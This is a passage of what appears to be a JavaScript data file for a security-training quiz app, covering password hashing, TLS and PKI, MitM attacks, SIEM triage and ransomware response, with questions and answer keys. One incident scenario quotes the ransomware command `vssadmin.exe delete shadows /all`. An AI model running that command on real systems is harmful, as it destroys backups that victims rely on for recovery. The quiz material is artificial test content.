        scenario: 'Your login API endpoint experiences 50,000 requests/minute from a distributed botnet testing username/password combinations leaked from a third-party breach.',
        question: 'What multi-layered defenses should be deployed at the API gateway?',
        options: [
          'Rate limiting per IP/Account, CAPTCHA on suspicious spikes, and enforcing MFA on unrecognized devices',
          'Allowing unlimited attempts to see which passwords work',
          'Encrypting the URL path',
          'Changing server domain name'
        ],
        correctOption: 0,
        explanation: 'Credential stuffing relies on high-volume automated requests. Rate limiting, CAPTCHA challenges, and MFA neutralize bot attacks.'
      },
      {
        id: 'pwd-th-4',
        title: 'Salt Uniqueness Vulnerability',
        scenario: 'A junior developer added a hardcoded static salt string `"MySecretSalt123"` to all user password hashing function calls.',
        question: 'Why is a global static salt insufficient compared to per-user random salts?',
        options: [
          'Static salts allow attackers to build a single rainbow table for all users in that specific database',
          'Static salts corrupt the password text',
          'Static salts slow down the server',
          'Static salts disable HTTPS'
        ],
        correctOption: 0,
        explanation: 'Per-user random salts ensure identical user passwords generate completely different hashes, neutralizing targeted lookup tables.'
      },
      {
        id: 'pwd-th-5',
        title: 'Vault Security Model Evaluation',
        scenario: 'An enterprise wants to deploy an enterprise Password Manager. The security team audits the zero-knowledge architecture.',
        question: 'What guarantees zero-knowledge privacy in cloud-synced vaults?',
        options: [
          'Client-side AES-GCM encryption where the vault is decrypted using a master key that never leaves the client device memory',
          'Storing master keys in server database plain-text',
          'Sending unencrypted backups via email',
          'Using HTTP without SSL'
        ],
        correctOption: 0,
        explanation: 'Zero-knowledge architecture ensures cloud servers store only blob ciphertext, lacking access to decryption keys.'
      }
    ]
  },
  'network-security': {
    id: 'network-security',
    title: 'Cryptography & Network Threat Defense',
    description: 'Learn TLS/HTTPS handshake, Public Key Infrastructure (PKI), Man-in-the-Middle (MitM) attacks, and VPN/DNS security.',
    category: 'Network & System Security',
    estimatedTime: '40 mins',
    studyResource: {
      overview: 'Network traffic traverses untrusted switches, routers, and wireless access points. Robust network defense relies on Transport Layer Security (TLS 1.3), Public Key Infrastructure (PKI), HSTS preloading, zero-trust network segmentation, and WireGuard VPN tunnels to prevent eavesdropping and Man-in-the-Middle (MitM) packet interception.',
      detailedTopics: [
        {
          topicTitle: 'Topic 1: Symmetric vs Asymmetric Encryption & PKI',
          subheading: 'AES-256, RSA/ECC Key Exchange & Digital Certificate Authorities',
          content: 'Symmetric encryption (e.g. AES-256-GCM) uses the exact same secret key for both encryption and decryption, offering extreme speed for bulk data transmission. Asymmetric encryption (e.g. RSA-4096, ECC Ed25519) uses a mathematically linked pair: a Public Key (distributed freely to encrypt or verify signatures) and a Private Key (kept secret to decrypt or create signatures). PKI (Public Key Infrastructure) relies on trusted Certificate Authorities (CAs) like Let\'s Encrypt to issue x509 digital certificates validating server identity.',
          keyTakeaways: [
            'Symmetric encryption (AES-256) is fast and used for bulk traffic payload encryption.',
            'Asymmetric encryption (RSA/ECC) is used for key exchange and digital signature verification.',
            'Certificate Authorities (CAs) digitally sign x509 certificates to verify domain ownership.'
          ]
        },
        {
          topicTitle: 'Topic 2: TLS 1.3 Handshake & HSTS Enforcement',
          subheading: '1-RTT Handshake, Ephemeral Diffie-Hellman & Perfect Forward Secrecy',
          content: 'The TLS 1.3 handshake establishes encrypted communications in just 1 RTT (Round Trip Time) by removing legacy vulnerable ciphers (e.g. RC4, 3DES, static RSA key exchange). Using Ephemeral Diffie-Hellman (ECDHE), TLS 1.3 guarantees Perfect Forward Secrecy (PFS)—ensuring that even if a server\'s private key is stolen in the future, past recorded session traffic cannot be decrypted. HSTS (HTTP Strict Transport Security) header forces browsers to use HTTPS exclusively.',
          keyTakeaways: [
            'TLS 1.3 reduces handshake latency to 1-RTT while removing insecure legacy ciphers.',
            'Perfect Forward Secrecy (PFS) ensures past recorded session traffic remains safe if keys leak.',
            'HSTS header (max-age=31536000) prevents SSL stripping and HTTP downgrade attacks.'
          ]
        },
        {
          topicTitle: 'Topic 3: Network MitM, Firewalls & VPN Technologies',
          subheading: 'ARP Spoofing, DNS over HTTPS (DoH) & WireGuard Tunnels',
          content: 'Man-in-the-Middle (MitM) attacks occur on local networks via ARP Spoofing, where attackers send fake ARP replies binding their MAC address to the default gateway IP. Next-Generation Firewalls (NGFW) inspect packet headers and layer-7 application payloads. WireGuard is a modern lightweight VPN protocol using Noise protocol framework and ChaCha20-Poly1305 encryption. DNS over HTTPS (DoH) encrypts DNS lookups over TCP port 443.',
          keyTakeaways: [
            'ARP Spoofing tricks local network devices into routing traffic through an attacker machine.',
            'WireGuard provides high-speed, modern encrypted VPN tunneling.',
            'DNS over HTTPS (DoH) encrypts domain name queries over standard TLS port 443.'
          ]
        }
      ],
      keyConcepts: [
        { concept: 'TLS/SSL Handshake', detail: 'Asymmetric encryption establishes session keys, followed by fast symmetric AES encryption for data in transit.' },
        { concept: 'Public Key Infrastructure (PKI)', detail: 'Certificate Authorities (CAs) digitally sign server certificates to prove identity.' },
        { concept: 'Man-in-the-Middle (MitM)', detail: 'Attackers intercept or alter network packets using ARP spoofing or rogue Wi-Fi access points.' }
      ],
      realWorldCaseStudy: {
        title: 'Public Wi-Fi Rogue Access Point Interception',
        incident: 'Attackers set up an open Wi-Fi named "CoffeeShop_Free" and intercepted unencrypted HTTP web traffic.',
        mitigation: 'Enforced HTTPS Strict Transport Security (HSTS) with preloading across all corporate subdomains.'
      },
      industryBestPractices: [
        'Enforce HTTPS everywhere with HTTP Strict Transport Security (HSTS) max-age=31536000.',
        'Never ignore self-signed certificate warnings on untrusted public networks.',
        'Use DNS over HTTPS (DoH) or WireGuard VPN to encrypt DNS queries on public Wi-Fi.'
      ],
      cheatSheetSummary: [
        'TLS 1.3: 1-RTT Handshake with mandatory Ephemeral Diffie-Hellman (PFS).',
        'PFS (Perfect Forward Secrecy): Prevents retroactive decryption of past session captures.',
        'HSTS Header: Forces HTTPS connections and blocks SSL stripping attacks.',
        'Symmetric vs Asymmetric: AES-256 for speed; RSA/ECC for key distribution.',
        'DoH (DNS over HTTPS): Encrypts DNS queries over port 443.'
      ]
    },
    mcqs: Array.from({ length: 15 }, (_, i) => ({
      id: `net-mcq-${i + 1}`,
      question: [
        'What protocol provides encryption for HTTP web traffic?',
        'What type of encryption uses a Public key to encrypt and Private key to decrypt?',
        'What is a Man-in-the-Middle (MitM) attack?',
        'What does HSTS (HTTP Strict Transport Security) header force browsers to do?',
        'What is a Certificate Authority (CA)?',
        'Which symmetric encryption cipher is industry standard (AES-256)?',
        'What port does default HTTPS traffic run on?',
        'What is ARP Spoofing on a local Ethernet/Wi-Fi network?',
        'What is WireGuard?',
        'What does DNS over HTTPS (DoH) encrypt?',
        'What is Perfect Forward Secrecy (PFS)?',
        'What happens if a Certificate Authority private key is compromised?',
        'What is a Firewall?',
        'What does TLS 1.3 remove compared to older TLS versions?',
        'What is a VPN (Virtual Private Network)?'
      ][i],
      options: [
        ['TLS (Transport Layer Security)', 'FTP', 'Telnet', 'SNMP'],
        ['Asymmetric / Public-Key Encryption', 'Symmetric Encryption', 'ROT13', 'Base64'],
        ['An attacker secretly intercepts and relays communication between two parties', 'Direct server crash', 'Hardware theft', 'Phishing email'],
        ['Force connection over HTTPS only, blocking HTTP downgrades', 'Disable cookies', 'Allow frame embedding', 'Delete cache'],
        ['Trusted entity issuing signed digital identity certificates', 'A router brand', 'A domain host', 'A virus maker'],
        ['Advanced Encryption Standard (AES)', 'DES', 'RC4', 'MD5'],
        ['Port 443', 'Port 80', 'Port 21', 'Port 25'],
        ['Linking attacker MAC address with legitimate gateway IP address', 'Wi-Fi password crack', 'Database delete', 'Email spam'],
        ['Modern high-performance VPN protocol', 'A web browser', 'A code editor', 'A database'],
        ['DNS domain name resolution queries', 'Video streams', 'Mouse clicks', 'CPU usage'],
        ['Compromise of long-term private key does not compromise past session keys', 'Fast downloading', 'Unlimited storage', 'Free domain'],
        ['Attacker can issue trusted spoofed certificates for any domain', 'Internet turns off', 'PCs lock up', 'Nothing'],
        ['Network security system monitoring and controlling incoming/outgoing network traffic', 'Anti-virus software', 'Monitor filter', 'Power outlet'],
        ['Insecure legacy cryptographic ciphers (RSA key exchange, SHA-1)', 'HTTPS support', 'Cookies', 'CSS styles'],
        ['Encrypted tunnel routing network traffic through a secure server', 'Browser extension', 'Search engine', 'Video card']
      ][i],
      correctAnswer: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0][i],
      explanation: `Network defense relies on PKI certificate validation, TLS 1.3 encryption, and HSTS headers.`
    })),
    theoryProblems: [
      {
        id: 'net-th-1',
        title: 'Rogue Wi-Fi Access Point SSL Stripping Attack',
        scenario: 'A student connects to an open airport Wi-Fi. An attacker runs `sslstrip` to downgrade `http://bank.com` traffic from HTTPS to plain HTTP.',
        question: 'What header prevents browsers from ever loading the site over unencrypted HTTP?',
        options: [
          'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
          'X-Content-Type-Options: nosniff',
          'Cache-Control: no-cache',
          'Access-Control-Allow-Origin: *'
        ],
        correctOption: 0,
        explanation: 'HSTS instructs browsers to hardcode HTTPS connections and refuse connection if SSL stripping or invalid certificates are detected.'
      },
      {
        id: 'net-th-2',
        title: 'Self-Signed SSL Certificate Warning Bypass',
        scenario: 'An employee visiting internal portal `https://internal.company.com` sees a scary browser alert: "Your connection is not private. Certificate Issuer is Untrusted". The employee clicks "Proceed Anyway".',
        question: 'Why is bypassing certificate warnings on public networks extremely high risk?',
        options: [
          'An attacker running ARP spoofing or rogue DNS may be proxying and decrypting all user data in plaintext',
          'It slows down internet speeds',
          'It deletes browser bookmarks',
          'It changes display colors'
        ],
        correctOption: 0,
        explanation: 'Untrusted certificate warnings mean the server identity cannot be verified, indicating a potential active Man-in-the-Middle proxy.'
      },
      {
        id: 'net-th-3',
        title: 'DNS Hijacking & Poisoning Incident',
        scenario: 'Hackers compromised an ISP DNS server and changed the A-record resolution for `payroll.company.com` to point to an attacker IP address in Eastern Europe.',
        question: 'What protocol validates DNS record authenticity using cryptographic signatures?',
        options: [
          'DNSSEC (Domain Name System Security Extensions)',
          'DHCP',
          'BGP Routing',
          'ICMP Ping'
        ],
        correctOption: 0,
        explanation: 'DNSSEC adds digital signatures to DNS records, allowing resolvers to verify responses originate from authoritative domain name servers.'
      },
      {
        id: 'net-th-4',
        title: 'Symmetric vs Asymmetric Encryption Hybrid Architecture',
        scenario: 'A developer asks why web browsers use RSA/ECC asymmetric encryption during the initial handshake, but switch to AES-GCM symmetric encryption for data transfer.',
        question: 'What is the performance and architectural rationale behind hybrid cryptosystems?',
        options: [
          'Asymmetric key exchange securely shares session keys; symmetric encryption is 1,000x faster for bulk data throughput',
          'Asymmetric encryption cannot process text',
          'Symmetric encryption does not require keys',
          'Browsers cannot run AES'
        ],
        correctOption: 0,
        explanation: 'Asymmetric algorithms solve key distribution; symmetric algorithms (AES) provide blazing fast hardware-accelerated payload encryption.'
      },
      {
        id: 'net-th-5',
        title: 'Enterprise VPN Split-Tunneling Risk Audit',
        scenario: 'Remote employees use corporate VPNs. IT configured "Split-Tunneling", routing corporate traffic through VPN while general web browsing bypasses the VPN directly to public ISPs.',
        question: 'What security trade-off occurs with split-tunneling enabled?',
        options: [
          'Saves bandwidth but exposes general web browsing and DNS to local public network threats without corporate firewall inspection',
          'Improves server graphics',
          'Deletes user files',
          'Disables Windows firewall'
        ],
        correctOption: 0,
        explanation: 'Split-tunneling reduces corporate VPN bandwidth usage but bypasses enterprise web filtering for general internet traffic.'
      }
    ]
  },
  'threat-intel': {
    id: 'threat-intel',
    title: 'Threat Intelligence, SIEM Triage & Incident Response',
    description: 'Learn SOC monitoring, ransomware mitigation, 3-2-1 immutable backup recovery, and malware sandbox analysis.',
    category: 'Security Operations & Incident Response',
    estimatedTime: '45 mins',
    studyResource: {
      overview: 'Security Operations Centers (SOC) use SIEM, EDR, and Threat Intelligence frameworks to detect, triage, and neutralize sophisticated adversary attacks. Master the MITRE ATT&CK taxonomy, Indicators of Compromise (IoCs), NIST Incident Response playbook steps, and 3-2-1 immutable ransomware recovery strategies.',
      detailedTopics: [
        {
          topicTitle: 'Topic 1: MITRE ATT&CK Framework & Cyber Kill Chain',
          subheading: 'Tactics, Techniques & Procedures (TTPs) for Adversary Tracking',
          content: 'The MITRE ATT&CK framework is a globally accessible matrix of real-world adversary Tactics (high-level goals like Initial Access or Lateral Movement) and Techniques (specific methods like Credential Dumping via Mimikatz). The Lockheed Martin Cyber Kill Chain defines the 7 sequential stages of an attack: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control (C2), and Actions on Objectives.',
          keyTakeaways: [
            'MITRE ATT&CK maps adversary Tactics, Techniques, and Procedures (TTPs).',
            'Lateral Movement refers to an attacker expanding access from an initial compromise deeper into internal network servers.',
            'Breaking any link in the 7-stage Cyber Kill Chain prevents successful compromise.'
          ]
        },
        {
          topicTitle: 'Topic 2: SIEM Log Correlation, EDR Telemetry & IoCs',
          subheading: 'Splunk/Elastic Rule Engineering, File Hashes & Living-off-the-Land Defenses',
          content: 'SIEM (Security Information and Event Management) platforms ingest syslog, firewall, and active directory authentication logs, using correlation rules to trigger alerts on anomalous behavior. EDR (Endpoint Detection & Response) agents monitor process trees, memory injection, and registry changes on workstations. Indicators of Compromise (IoCs) include SHA-256 malware hashes, malicious C2 IP addresses, and suspicious registry keys. Restricting non-admin PowerShell script execution blocks fileless living-off-the-land attacks.',
          keyTakeaways: [
            'SIEM correlates logs across firewalls, servers, and active directory to spot multi-stage attacks.',
            'Indicators of Compromise (IoCs) are forensic artifacts (file hashes, IPs, domains) indicating system breach.',
            'EDR provides deep visibility into process execution trees and living-off-the-land binaries.'
          ]
        },
        {
          topicTitle: 'Topic 3: Incident Response Lifecycle & Ransomware Mitigations',
          subheading: 'NIST SP 800-61 Playbook, Double Extortion & 3-2-1 Immutable Backups',
          content: 'NIST SP 800-61 outlines the 4 stages of Incident Response: 1) Preparation, 2) Detection & Analysis, 3) Containment, Eradication & Recovery, and 4) Post-Incident Activity. Double Extortion Ransomware encrypts local drives while simultaneously exfiltrating sensitive corporate files to public leak sites. The 3-2-1 backup strategy (3 copies of data, across 2 different media types, with 1 off-site immutable air-gapped copy) guarantees full recovery without paying ransom. Zero Trust Architecture operates on the motto "Never Trust, Always Verify".',
          keyTakeaways: [
            'NIST SP 800-61 defines the standard 4-phase Incident Response lifecycle.',
            'Double Extortion threatens both file encryption AND public data leak exfiltration.',
            'The 3-2-1 Immutable Air-Gapped backup strategy is the ultimate defense against ransomware.',
            'Zero Trust Architecture motto: "Never Trust, Always Verify".'
          ]
        }
      ],
      keyConcepts: [
        { concept: 'SIEM Log Correlation', detail: 'Aggregates syslog, firewall, and auth logs into Splunk/Elastic to correlate multi-stage attacks.' },
        { concept: '3-2-1 Immutable Backup Strategy', detail: '3 copies, 2 media types, 1 off-site air-gapped immutable backup to recover from Ransomware.' },
        { concept: 'Endpoint Detection & Response (EDR)', detail: 'Agents running on devices (CrowdStrike/Defender) detecting malicious Process creation trees.' }
      ],
      realWorldCaseStudy: {
        title: 'Double Extortion Ransomware Outbreak Recovery',
        incident: 'BlackCat ransomware encrypted 50 servers and threatened data leak unless 20 Bitcoin was paid.',
        mitigation: 'Restored entire infrastructure within 12 hours from immutable S3 Glacier Object Lock off-site backups without paying ransom.'
      },
      industryBestPractices: [
        'Maintain immutable, air-gapped backups (Object Lock enabled).',
        'Enforce Least Privilege local admin rights (block PowerShell execution for non-admins).',
        'Deploy EDR telemetry agents across 100% of endpoints.'
      ],
      cheatSheetSummary: [
        'SIEM: Security Information and Event Management (Log ingestion & correlation).',
        'MITRE ATT&CK: Knowledge base mapping adversary Tactics, Techniques, and Procedures (TTPs).',
        '3-2-1 Rule: 3 data copies, 2 media types, 1 off-site air-gapped immutable copy.',
        'Zero Trust Motto: "Never Trust, Always Verify".',
        'Double Extortion: Encryption of files + Threat of exfiltrated data leak.'
      ]
    },
    mcqs: Array.from({ length: 15 }, (_, i) => ({
      id: `threat-mcq-${i + 1}`,
      question: [
        'What does SIEM stand for in Security Operations?',
        'What is the 3-2-1 backup rule strategy?',
        'What is Double Extortion in Ransomware attacks?',
        'What does EDR (Endpoint Detection & Response) monitor?',
        'What is an Indicator of Compromise (IoC)?',
        'What is the MITRE ATT&CK Framework?',
        'What is a Malware Sandbox?',
        'What is Lateral Movement during a network intrusion?',
        'What is Zero Trust Architecture motto?',
        'Why should PowerShell script execution be restricted on non-admin user workstations?',
        'What is Data Exfiltration?',
        'What role does an Incident Response Plan play?',
        'What is Air-Gapped backup storage?',
        'What is Log Correlation in SIEM tools like Splunk?',
        'What is CISA (Cybersecurity and Infrastructure Security Agency)?'
      ][i],
      options: [
        ['Security Information and Event Management', 'System Error Monitor', 'Secure Internet Mail', 'Software Installer'],
        ['3 copies, 2 media types, 1 off-site immutable backup', '3 passwords, 2 users, 1 PC', '3 routers, 2 switches, 1 firewall', '3 backups daily'],
        ['Encrypting files AND threatening public leak of stolen sensitive data', 'Charging double fee', 'Hacking 2 PCs', 'Two viruses'],
        ['Real-time process, registry, and memory telemetry on endpoint devices', 'Email inbox only', 'Monitor brightness', 'Keyboard speed'],
        ['Artifact or signature indicating a system has been infected (e.g. IP, File Hash)', 'User password', 'Computer brand', 'Screen resolution'],
        ['Knowledge base of adversary tactics, techniques, and procedures (TTPs)', 'A anti-virus app', 'A programming language', 'A browser'],
        ['Isolated environment to safely detonate and analyze suspicious files', 'A beach game', 'A cloud storage folder', 'A hardware router'],
        ['Attacker moving from initial access point deeper into internal network servers', 'Moving office desks', 'Upgrading cables', 'Changing passwords'],
        ['"Never Trust, Always Verify"', '"Trust Everything"', '"Passwords Only"', '"Open Network"'],
        ['Prevent fileless malware scripts from executing living-off-the-land attacks', 'Saves CPU', 'Makes Windows faster', 'Prevents print errors'],
        ['Unauthorized transfer of sensitive data outside corporate boundary', 'Deleting data', 'Compressing files', 'Printing pages'],
        ['Pre-defined playbook guiding containment, eradication, and recovery during breaches', 'A insurance document', 'A software manual', 'A billing invoice'],
        ['Storage disconnected completely from network, making remote encryption impossible', 'Cloud drive', 'Shared folder', 'USB hub'],
        ['Combining related log entries from multiple servers to detect attack patterns', 'Deleting logs', 'Filtering spam', 'Auto-correcting text'],
        ['US federal agency leading cyber defense and infrastructure protection', 'A router vendor', 'A software brand', 'A university class']
      ][i],
      correctAnswer: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0][i],
      explanation: `Incident response requires SIEM log triage, EDR process monitoring, MITRE ATT&CK framework mapping, and immutable backups.`
    })),
    theoryProblems: [
      {
        id: 'threat-th-1',
        title: 'Active Ransomware Outbreak Incident Containment',
        scenario: 'At 2:00 AM, the EDR system alerts that 5 workstation hosts are executing `vssadmin.exe delete shadows /all` and bulk encrypting `.docx` files with `.locked` extensions.',
        question: 'What immediate containment step must the SOC responder execute?',
        options: [
          'Isolate the infected hosts from the network via EDR console immediately to prevent lateral spreading',
          'Wait until morning to inform the manager',
          'Restart the domain controller',
          'Pay the ransom cryptocurrency'
        ],
        correctOption: 0,
        explanation: 'Network isolation of compromised endpoints stops ransomware lateral movement and limits bulk encryption spread.'
      },
      {
        id: 'threat-th-2',
        title: 'SIEM Credential Dumping Log Alert Triage',
        scenario: 'Splunk SIEM triggers a High severity alert: Process `mimikatz.exe` executed on Domain Controller `DC-01`, attempting to dump LSASS process memory credentials.',
        question: 'What attack technique and risk does this alert signify?',
        options: [
          'OS Credential Dumping attempting to extract Kerberos Golden Tickets & admin password hashes',
          'Routine Windows update patch',
          'Database backup execution',
          'Web browser cache clearing'
        ],
        correctOption: 0,
        explanation: 'LSASS memory dumping via Mimikatz is a classic credential harvesting technique used to escalate privileges to Enterprise Admin.'
      },
      {
        id: 'threat-th-3',
        title: 'Immutable Backup Recovery Validation',
        scenario: 'An enterprise suffers full domain controller encryption. The backup admin attempts recovery from cloud backups, but finds attacker deleted online cloud backup snapshots.',
        question: 'What backup storage configuration would have protected the snapshots from deletion?',
        options: [
          'AWS S3 Glacier Object Lock in Compliance Mode (WORM - Write Once Read Many)',
          'Standard network shared folder (SMB)',
          'Syncing to Dropbox',
          'Local USB hard drive plugged into server'
        ],
        correctOption: 0,
        explanation: 'WORM (Write Once Read Many) Object Lock prevents any user or attacker root account from deleting or altering backup snapshots for a fixed retention period.'
      },
      {
        id: 'threat-th-4',
        title: 'Supply Chain Component Compromise (SolarWinds style)',
        scenario: 'A trusted third-party network monitoring software update contained a signed malicious backdoor DLL that opened covert HTTP C2 channels.',
        question: 'What defense-in-depth security measure detects unauthorized outbound C2 traffic?',
        options: [
          'Outbound Egress Network Filtering & Proxy Threat Intelligence inspection blocking unknown external IP connections',
          'Relying solely on anti-virus signature files',
          'Disabling Windows Firewall',
          'Deleting event logs'
        ],
        correctOption: 0,
        explanation: 'Strict outbound egress filtering prevents compromised internal software from establishing Command and Control (C2) channels.'
      },
      {
        id: 'threat-th-5',
        title: 'Zero Trust Network Architecture Implementation',
        scenario: 'A company abandons perimeter VPN security in favor of Zero Trust Architecture (ZTA).',
        question: 'What core principle defines Zero Trust endpoint access?',
        options: [
          'Every access request is authenticated, authorized, and cryptographically validated regardless of network location',
          'Trusting all IP addresses inside the office building',
          'Disabling multi-factor authentication',
          'Allowing anonymous guest access'
        ],
        correctOption: 0,
        explanation: 'Zero Trust operates under "Never Trust, Always Verify", evaluating identity, device health, and context for every request.'
      }
    ]
  }
};
